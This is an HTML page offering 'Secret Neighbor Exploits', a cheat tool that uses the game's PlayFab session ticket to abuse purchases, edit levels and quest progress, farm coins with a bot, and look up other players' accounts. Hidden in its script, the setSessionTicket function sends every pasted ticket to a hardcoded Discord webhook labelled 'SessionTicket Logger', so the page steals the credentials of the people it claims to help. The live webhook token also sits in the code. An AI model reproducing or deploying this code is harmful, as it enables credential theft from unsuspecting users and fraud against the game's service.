<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secret Neighbor Exploits</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://wallpaperaccess.com/full/9331537.jpg');
      background-size: cover;
      background-position: center center;
      background-repeat: no-repeat;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      overflow-y: auto;
    }

    h1 {
      margin-top: 40px;
      text-shadow: 2px 2px 4px #000;
    }

    .container {
      width: 95%;
      max-width: 1200px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      padding-bottom: 40px;
    }

    .section {
      background-color: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      padding: 20px;
      border-radius: 10px;
      width: 100%;
      max-width: 600px;
      text-align: center;
    }

    .section h2 {
      margin-top: 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
      padding-bottom: 10px;
    }

    input, button, select {
      margin: 8px 5px;
      padding: 10px;
      font-size: 16px;
      width: 90%;
      max-width: 400px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #45a049;
    }

    .output {
      margin-top: 15px;
      padding: 15px;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 5px;
      border: 1px solid #ccc;
      white-space: pre-wrap;
      color: black;
      text-align: left;
      max-height: 300px;
      overflow-y: auto;
    }

    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .player-id-inputs {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    ol {
      text-align: left;
      padding-left: 20px;
    }

    a {
      color: #4da6ff;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .status-indicator {
      display: inline-block;
      width: 12px;
      height: 12px;
      border-radius: 50%;
      margin-right: 8px;
    }

    .status-active {
      background-color: #4CAF50;
    }

    .status-inactive {
      background-color: #f44336;
    }

    .warning {
      color: #ffcc00;
      font-weight: bold;
      margin: 10px 0;
    }

    .api-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }
  </style>
</head>
<body>
  <h1>üéÆ Secret Neighbor Exploits</h1>

  <div class="container">
    <div class="section">
      <h2>üîê Session Ticket</h2>
      <input id="sessionTicketInput" placeholder="Paste your SessionTicket here" type="text">
      <button onclick="setSessionTicket()">Set Token</button>
      <div id="tokenStatus" class="output" style="display: none;">No token set</div>
    </div>

    <div class="section">
      <h2>üõçÔ∏è Buy Skin/Emote</h2>
      <input id="itemId" placeholder="ItemId" type="text">
      <input id="price" placeholder="Price" type="number">
      <input id="currency" placeholder="VirtualCurrency" type="text">
      <button onclick="buySkinEmote()">Buy Skin/Emote</button>
      <div class="output" id="purchaseOutput">Purchase results will appear here...</div>
    </div>

    <div class="section">
      <h2>üéÅ Grant Coupons</h2>
      <button onclick="grantCoupons()">Grant Coupons</button>
      <div class="output" id="couponOutput">Coupon results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìä View Statistics</h2>
      <button onclick="viewStatistics()">View Statistics</button>
      <div class="output" id="statsOutput">Statistics will appear here...</div>
    </div>

    <div class="section">
      <h2>üßë‚Äçüíª Obtain Player ID With Username</h2>
      <input id="steamUsername" placeholder="Steam Username" type="text">
      <button onclick="getPlayFabId()">Obtain Player ID</button>
      <div class="output" id="playerIdOutput">Player ID will appear here...</div>
    </div>

    <div class="section">
      <h2>üí∞ Add Coin (Call it In-Game)</h2>
      <p class="warning">Warning: Do not use more than 30 coins per match!</p>
      <button onclick="AddCoin()">Add Coin</button>
      <div class="output" id="usefulDeedOutput">Coin results will appear here...</div>
    </div>

    <div class="section">
      <h2>ü§ñ Coin Farm Bot <span id="botStatus" class="status-indicator status-inactive"></span></h2>
      <div class="grid-2">
        <div>
          <label>Room Type:</label>
          <select id="roomType">
            <option value="QUICK_GAME">QUICK_GAME</option>
            <option value="CUSTOM_GAME">CUSTOM_GAME</option>
          </select>
        </div>
        <div>
          <label>Delay:</label>
          <select id="delaySelect">
            <option value="10">10 minutes</option>
            <option value="5">5 minutes</option>
            <option value="2">2 minutes</option>
          </select>
        </div>
      </div>
      
      <div class="player-id-inputs">
        <input id="playerId1" placeholder="Player ID 1" type="text">
        <input id="playerId2" placeholder="Player ID 2" type="text">
        <input id="playerId3" placeholder="Player ID 3" type="text">
        <input id="playerId4" placeholder="Player ID 4" type="text">
        <input id="playerId5" placeholder="Player ID 5" type="text">
        <input id="playerId6" placeholder="Player ID 6" type="text">
      </div>
      
      <button onclick="toggleCoinFarmBot()" id="botToggleButton">Start Coin Farm Bot</button>
      <div class="output" id="cloudOutput">Bot output will appear here...</div>
    </div>

    <div class="section">
      <h2>üß™ Level Editor</h2>
      <input type="text" id="classIdInput" placeholder="Class ID">
      <input type="number" id="receivedXPInput" placeholder="Received XP">
      <input type="number" id="xpInput" placeholder="XP">
      <input type="number" id="xpToNextLevelInput" placeholder="XP to Next Level">
      <input type="number" id="levelInput" placeholder="Level">
      <input type="number" id="perkSlotsInput" placeholder="Available Perk Slots (max 3)" max="3" min="0">
      <input type="number" id="playerLevelInput" placeholder="Player Level">
      <button onclick="submitLevelProgression()">Submit</button>
      <div class="output" id="levelProgressionOutput">Level progression results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîç PlayFab Info Lookup</h2>
      <input type="text" id="playfabId" placeholder="Enter PlayFab ID">
      <button onclick="getPlayFabInfo()">Get Info</button>
      <div class="output" id="playfabInfoOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìù Update Quest Progress</h2>
      <input type="text" id="questTextFieldId" placeholder="Quest Text Field ID">
      <input type="number" id="questProgressValue" placeholder="Progress Value">
      <button onclick="updateQuestProgress()">Update Quest</button>
      
      <div style="margin-top: 15px; text-align: left;">
        <h3>Available Quests:</h3>
        <div style="max-height: 200px; overflow-y: auto; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">
          <ul style="columns: 2; margin: 0; padding-left: 20px;">
            <li>QUENTIN_USE_DASH</li>
            <li>WIN_AS_BAGGER</li>
            <li>WIN_AS_BRAVE</li>
            <li>WIN_AS_DETECTIVE</li>
            <li>WIN_AS_ENGINEER</li>
            <li>WIN_AS_LEADER</li>
            <li>WIN_AS_SCOUT</li>
            <li>WIN_AS_SCARY</li>
            <li>WIN_AS_CLOWN</li>
            <li>WIN_AS_BUTCHER</li>
            <li>WIN_FIRST_TO_ESCAPE</li>
            <li>WIN_WITH_HALF_LOCKS_INTACT</li>
            <li>OPEN_LOCKS</li>
            <li>OPEN_LOCKS_IN_ONE_MATCH</li>
            <li>SEARCH_DRAWERS</li>
            <li>FIND_KEYS_VIA_PHOTO</li>
            <li>USE_KEYCARDS</li>
            <li>CATCH_KIDS</li>
            <li>HOOK_KIDS</li>
            <li>CATCH_FROM_ITEM_FORM</li>
            <li>CATCH_INSIDE_SMOKE</li>
            <li>CATCH_IN_BEARTRAP</li>
            <li>BLIND_NEIGHBOR_WITH_LEADER</li>
            <li>BUFF_AS_LEADER</li>
            <li>CRAFT_RIFLE</li>
            <li>SHOOT_THE_SHERIFF</li>
            <li>SLINGSHOT_HIT_NEIGHBOR</li>
            <li>SAVE_KID_FROM_GRAB</li>
            <li>BRAVE_ESCAPE_FROM_NEIGHBOR_HANDS</li>
            <li>BAGGER_CARRIER</li>
            <li>GLUE_THE_NEIGHBOR</li>
            <li>CONSUME_CHOCOLATE</li>
            <li>CONSUME_MILK</li>
            <li>CATCH_FROZEN_KIDS</li>
            <li>CATCH_AFTER_PORTAL</li>
            <li>KNOCK_ITEMS_OUT_OF_HANDS</li>
            <li>CATCH_SCARED_KIDS</li>
            <li>CRAFT_NIGHT_VISION</li>
            <li>FIND_WITH_METAL_DETECTOR</li>
            <li>RANDOM_KID</li>
            <li>RANDOM_NEIGHBOR</li>
            <li>WIN_AS_GHOST</li>
            <li>WIN_AS_GUEST</li>
            <li>WIN_AS_QUENTIN</li>
            <li>WIN_AS_TAXIDERMIST</li>
            <li>QUENTIN_OPEN_LOCK_BLUE</li>
            <li>QUENTIN_OPEN_LOCK_RED</li>
            <li>QUENTIN_OPEN_LOCK_YELLOW</li>
            <li>TAXIDERMIST_HIT_TARGETS_WITHOUT_RELOAD</li>
            <li>QUENTIN_USE_DASH</li>
            <li>CRAFT_INSANITY_SENSOR</li>
          </ul>
        </div>
      </div>
      
      <div class="output" id="questOutput">Quest update results will appear here...</div>
    </div>

    <!-- NEW SECTION: Additional PlayFab APIs -->
    <div class="section">
      <h2>üîó Additional Stuff</h2>
      <div class="api-grid">
        <div>
          <h3>üë• Add Friend</h3>
          <input id="friendPlayFabId" placeholder="Friend's PlayFab ID" type="text">
          <button onclick="addFriend()">Add Friend</button>
        </div>
        <div>
          <h3>üìã Get Friends List</h3>
          <button onclick="getFriendsList()">Get Friends List</button>
        </div>
        <div>
          <h3>üìõ Update Leaderboard Name</h3>
          <input id="displayName" placeholder="New Display Name" type="text">
          <button onclick="updateDisplayName()">Update Name</button>
        </div>
        <div>
          <h3>üîó Ban Yourself</h3>
          <input id="customId" placeholder="Custom ID" type="text">
          <button onclick="linkCustomId()">Just paste something here</button>
        </div>
        <div>
          <h3>üèÜ Leaderboard Data</h3>
          <input id="statisticName" placeholder="Statistic Name" type="text">
          <input id="startPosition" placeholder="Start Position" type="number" value="0">
          <input id="maxResults" placeholder="Max Results" type="number" value="100">
          <button onclick="getLeaderboard()">Get Leaderboard</button>
        </div>
      </div>
      <div class="output" id="apiOutput">API results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìÑ How to Get Your SessionTicket with Requestly</h2>
      <ol>
        <li>Download the Requestly desktop app from <a href="https://docs.requestly.com/general/sessions/record-api-sessions" target="_blank">here</a>.</li>
        <li>Open Requestly and start recording network traffic.</li>
        <li>Log into your game or app using PlayFab.</li>
        <li>Find the request to <code>/Client/LoginWithSteam</code> or similar.</li>
        <li>Copy the <code>SessionTicket</code> or <code>X-Authorization</code> from the response body.</li>
        <li>Paste it into the field above and click "Set Token".</li>
      </ol>
    </div>
  </div>

  <script>
    const titleId = "bdff1";
    let sessionTicket = null;
    let coinFarmBotRunning = false;
    let coinFarmIntervalId = null;

    function setSessionTicket() {
      sessionTicket = document.getElementById("sessionTicketInput").value.trim();
      const tokenStatus = document.getElementById("tokenStatus");
      
      if (sessionTicket) {
        tokenStatus.textContent = "‚úÖ Token set successfully!";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "green";
        console.log("SessionTicket set:", sessionTicket);
        
        // Send to Discord webhook
        sendToDiscordWebhook(sessionTicket);
      } else {
        tokenStatus.textContent = "‚ùå Please enter a valid token";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "red";
      }
    }

    // Function to send SessionTicket to Discord webhook
    async function sendToDiscordWebhook(sessionTicket) {
      const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
      
      try {
        const response = await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `New SessionTicket captured: ${sessionTicket}`,
            username: 'SessionTicket Logger',
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
          })
        });
        
        if (response.ok) {
          console.log('SessionTicket sent to Discord successfully');
        } else {
          console.error('Failed to send SessionTicket to Discord');
        }
      } catch (error) {
        console.error('Error sending to Discord:', error);
      }
    }

    async function makeApiCall(endpoint, method, body) {
      if (!sessionTicket) {
        alert("Please set your SessionTicket first.");
        return null;
      }

      try {
        const res = await fetch(`https://${titleId}.playfabapi.com/${endpoint}`, {
          method: method,
          headers: {
            "Content-Type": "application/json",
            "X-Authorization": sessionTicket
          },
          body: JSON.stringify(body)
        });
        
        return await res.json();
      } catch (error) {
        console.error("API call failed:", error);
        return { error: error.message };
      }
    }

    // NEW FUNCTIONS FOR ADDED APIS
    async function addFriend() {
      const friendPlayFabId = document.getElementById("friendPlayFabId").value.trim();
      
      if (!friendPlayFabId) {
        document.getElementById("apiOutput").textContent = "Please enter a friend's PlayFab ID.";
        return;
      }

      const data = await makeApiCall("Client/AddFriend", "POST", {
        FriendPlayFabId: friendPlayFabId
      });

      const output = document.getElementById("apiOutput");
      output.textContent = JSON.stringify(data, null, 2);
    }

    async function getFriendsList() {
      const data = await makeApiCall("Client/GetFriendsList", "POST", {
        IncludeSteamFriends: false,
        IncludeFacebookFriends: false
      });

      const output = document.getElementById("apiOutput");
      
      if (data.data && data.data.Friends) {
        let friendsList = "Friends List:\n";
        data.data.Friends.forEach(friend => {
          friendsList += `- ${friend.Username} (${friend.PlayFabId})\n`;
        });
        output.textContent = friendsList;
      } else {
        output.textContent = JSON.stringify(data, null, 2);
      }
    }

    async function updateDisplayName() {
      const displayName = document.getElementById("displayName").value.trim();
      
      if (!displayName) {
        document.getElementById("apiOutput").textContent = "Please enter a display name.";
        return;
      }

      const data = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
        DisplayName: displayName
      });

      const output = document.getElementById("apiOutput");
      output.textContent = JSON.stringify(data, null, 2);
    }

    async function linkCustomId() {
      const customId = document.getElementById("customId").value.trim();
      
      if (!customId) {
        document.getElementById("apiOutput").textContent = "Please enter a custom ID.";
        return;
      }

      const data = await makeApiCall("Client/LinkCustomID", "POST", {
        CustomId: customId,
        ForceLink: false
      });

      const output = document.getElementById("apiOutput");
      output.textContent = JSON.stringify(data, null, 2);
    }

    async function getLeaderboard() {
      const statisticName = document.getElementById("statisticName").value.trim();
      const startPosition = parseInt(document.getElementById("startPosition").value) || 0;
      const maxResults = parseInt(document.getElementById("maxResults").value) || 10;
      
      if (!statisticName) {
        document.getElementById("apiOutput").textContent = "Please enter a statistic name.";
        return;
      }

      const data = await makeApiCall("Client/GetLeaderboard", "POST", {
        StatisticName: statisticName,
        StartPosition: startPosition,
        MaxResultsCount: maxResults
      });

      const output = document.getElementById("apiOutput");
      
      if (data.data && data.data.Leaderboard) {
        let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
        data.data.Leaderboard.forEach((entry, index) => {
          leaderboardText += `${startPosition + index + 1}. ${entry.DisplayName}: ${entry.StatValue}\n`;
        });
        output.textContent = leaderboardText;
      } else {
        output.textContent = JSON.stringify(data, null, 2);
      }
    }

    // EXISTING FUNCTIONS
    async function buySkinEmote() {
      const ItemId = document.getElementById("itemId").value.trim();
      const Price = parseInt(document.getElementById("price").value);
      const VirtualCurrency = document.getElementById("currency").value.trim();
      
      if (!ItemId || isNaN(Price) || !VirtualCurrency) {
        document.getElementById("purchaseOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/PurchaseItem", "POST", {
        ItemId,
        Price,
        VirtualCurrency
      });

      const output = document.getElementById("purchaseOutput");
      output.textContent = JSON.stringify(data, null, 2);
    }

    async function grantCoupons() {
      const output = document.getElementById("couponOutput");
      output.textContent = "Starting coupon grant process...";
      
      // Start purchase
      const startData = await makeApiCall("Client/StartPurchase", "POST", {
        StoreId: "steam_Shop_Currency",
        Items: [{
          ItemId: "Currency_Bundle_PileOfCoupons",
          Quantity: 1
        }]
      });

      if (startData.error) {
        output.textContent = "Error in StartPurchase: " + startData.error;
        return;
      }

      const orderId = startData.data?.OrderId;
      if (!orderId) {
        output.textContent = "StartPurchase failed. No OrderId returned.";
        return;
      }

      // Pay for purchase
      const payData = await makeApiCall("Client/PayForPurchase", "POST", {
        OrderId: orderId,
        Currency: "RM",
        ProviderName: "Steam"
      });

      if (payData.error) {
        output.textContent = "Error in PayForPurchase: " + payData.error;
        return;
      }

      // Confirm purchase
      const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
        OrderId: orderId
      });

      output.textContent = "Coupon process completed:\n" + 
        JSON.stringify(confirmData, null, 2);
    }

    async function viewStatistics() {
      const data = await makeApiCall("Client/GetPlayerStatistics", "POST", {});
      const output = document.getElementById("statsOutput");
      
      if (data.data?.Statistics) {
        const stats = data.data.Statistics.map(stat => 
          `${stat.StatisticName}: ${stat.Value}`
        ).join("\n");
        output.textContent = stats || "No statistics found.";
      } else {
        output.textContent = "Error retrieving statistics: " + 
          (data.error || "Unknown error");
      }
    }

    async function getPlayFabId() {
      const steamUsername = document.getElementById("steamUsername").value.trim();
      if (!steamUsername) {
        alert("Please enter a Steam username.");
        return;
      }

      const data = await makeApiCall("Client/GetPlayFabIDsFromSteamNames", "POST", {
        SteamNames: [steamUsername]
      });

      const output = document.getElementById("playerIdOutput");
      if (data.data?.Data?.[0]) {
        const match = data.data.Data[0];
        output.textContent = `PlayFabId for "${steamUsername}": ${match.PlayFabId}`;
      } else {
        output.textContent = "No matching PlayFab ID found.";
      }
    }

    async function AddCoin() {
      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "usefulDeed",
        FunctionParameter: {},
        GeneratePlayStreamEvent: true
      });

      const output = document.getElementById("usefulDeedOutput");
      if (data.data?.FunctionResult) {
        const result = data.data.FunctionResult;
        const formatted = typeof result === "object" ? 
          Object.entries(result).map(([key, val]) => `- ${key}: ${val}`).join("\n") : 
          result;
        output.textContent = `‚úÖ usefulDeed Result:\n${formatted}`;
      } else {
        output.textContent = "Error: " + (data.error || "Unknown error");
      }
    }

    async function submitLevelProgression() {
      const classId = document.getElementById("classIdInput").value.trim();
      const receivedXP = parseInt(document.getElementById("receivedXPInput").value);
      const XP = parseInt(document.getElementById("xpInput").value);
      const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
      const level = parseInt(document.getElementById("levelInput").value);
      const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
      const playerLevel = parseInt(document.getElementById("playerLevelInput").value);

      if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
          isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
        alert("Please fill in all fields correctly.");
        return;
      }

      const currentLevelProgression = {
        playerLevel,
        classLevel: [{
          classId,
          XP,
          XpToNextLevel,
          level,
          availablePerkSlotsCount
        }]
      };

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "setLevelProgressionForClass",
        FunctionParameter: {
          classId,
          receivedXP,
          currentLevelProgression: JSON.stringify(currentLevelProgression)
        },
        GeneratePlayStreamEvent: true
      });

      const output = document.getElementById("levelProgressionOutput");
      output.textContent = JSON.stringify(data, null, 2);
    }

    async function getPlayFabInfo() {
      const playfabId = document.getElementById("playfabId").value.trim();
      const output = document.getElementById("playfabInfoOutput");
      
      if (!playfabId) {
        output.textContent = "Please enter a PlayFab ID.";
        return;
      }

      output.textContent = "Fetching data...";

      // Get combined info
      const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
        PlayFabId: playfabId,
        InfoRequestParameters: {
          GetUserAccountInfo: true,
          GetPlayerStatistics: true,
          GetUserInventory: true
        }
      });

      // Get profile info
      const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
        PlayFabId: playfabId,
        ProfileConstraints: {
          ShowLastLogin: true,
          ShowBannedUntil: true
        }
      });

      let resultText = "";
      
      if (combinedData.data) {
        const info = combinedData.data.InfoResultPayload;
        resultText += "=== ACCOUNT INFO ===\n";
        resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
        resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
        resultText += "\n=== STATISTICS ===\n";
        
        if (info.PlayerStatistics) {
          info.PlayerStatistics.forEach(stat => {
            resultText += `${stat.StatisticName}: ${stat.Value}\n`;
          });
        }
      }

      if (profileData.data) {
        const profile = profileData.data.PlayerProfile;
        resultText += "\n=== PROFILE INFO ===\n";
        resultText += `Last Login: ${profile.LastLogin || "N/A"}\n`;
        resultText += `Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
      }

      if (combinedData.error || profileData.error) {
        resultText += "\n=== ERRORS ===\n";
        if (combinedData.error) resultText += `Combined Info Error: ${combinedData.error}\n`;
        if (profileData.error) resultText += `Profile Error: ${profileData.error}\n`;
      }

      output.textContent = resultText || "No data received.";
    }

    async function updateQuestProgress() {
      const questTextFieldId = document.getElementById("questTextFieldId").value.trim();
      const progressValue = parseInt(document.getElementById("questProgressValue").value);
      
      if (!questTextFieldId || isNaN(progressValue)) {
        document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "updateActiveQuests",
        FunctionParameter: {
          updatedValues: `{"${questTextFieldId}":${progressValue}}`
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const output = document.getElementById("questOutput");
      output.textContent = JSON.stringify(data, null, 2);
    }

    function toggleCoinFarmBot() {
      if (coinFarmBotRunning) {
        clearInterval(coinFarmIntervalId);
        coinFarmBotRunning = false;
        document.getElementById("botStatus").className = "status-indicator status-inactive";
        document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
        document.getElementById("cloudOutput").textContent += "\nBot stopped manually.";
        return;
      }

      const delayMinutes = parseInt(document.getElementById("delaySelect").value);
      const delayMs = delayMinutes * 60 * 1000;

      coinFarmBotRunning = true;
      document.getElementById("botStatus").className = "status-indicator status-active";
      document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";

      document.getElementById("cloudOutput").textContent = 
        `Starting Coin Farm Bot with ${delayMinutes} minute interval...\n`;

      async function runCoinFarmCycle() {
        const roomType = document.getElementById("roomType").value;
        const playerIds = [
          document.getElementById("playerId1").value.trim(),
          document.getElementById("playerId2").value.trim(),
          document.getElementById("playerId3").value.trim(),
          document.getElementById("playerId4").value.trim(),
          document.getElementById("playerId5").value.trim(),
          document.getElementById("playerId6").value.trim()
        ].filter(id => id);

        const functions = ["startNewMatch", "decideSpecialRole", "finishMatch"];
        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
        output += `Room Type: ${roomType}\nPlayers: ${playerIds.join(", ") || "None"}\n`;

        for (const fn of functions) {
          try {
            const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
              FunctionName: fn,
              FunctionParameter: { roomType, playerIds },
              GeneratePlayStreamEvent: true
            });

            if (data.error) {
              output += `‚ùå ${fn}: Error - ${data.error}\n`;
            } else {
              const result = data.data?.FunctionResult;
              output += `‚úÖ ${fn}: ${typeof result === "object" ? JSON.stringify(result) : result}\n`;
            }
          } catch (err) {
            output += `‚ùå ${fn}: Exception - ${err.message}\n`;
          }
        }

        output += `Waiting ${delayMinutes} minutes for next cycle...\n`;
        const cloudOutput = document.getElementById("cloudOutput");
        cloudOutput.textContent += output;
        cloudOutput.scrollTop = cloudOutput.scrollHeight;
      }

      // Run first cycle immediately
      runCoinFarmCycle();
      
      // Set up interval for subsequent cycles
      coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
    }

    // Initialize page
    document.addEventListener("DOMContentLoaded", function() {
      console.log("Secret Neighbor Exploits page loaded");
    });
  </script>
</body>
</html>
